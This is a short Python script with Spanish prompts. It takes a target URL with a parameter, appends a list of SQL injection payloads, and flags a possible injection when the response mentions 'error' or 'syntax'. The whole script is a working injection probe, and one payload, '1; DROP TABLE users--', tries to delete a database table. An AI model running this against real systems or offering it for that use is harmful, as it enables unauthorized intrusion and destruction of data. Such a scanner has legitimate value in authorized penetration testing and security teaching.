import requests

url = input("URL vulnerable con parámetro (ej: http://192.168.1.10:8080/user?id=): ")

payloads = ["1'", "1=1--", "' OR '1'='1", "1; DROP TABLE users--"]

for payload in payloads:
    target = url + payload
    r = requests.get(target)
    
    if "error" in r.text.lower() or "syntax" in r.text.lower():
        print(f"Posible inyección con: {payload}")
    else:
        print(f"No se detectó con: {payload}")
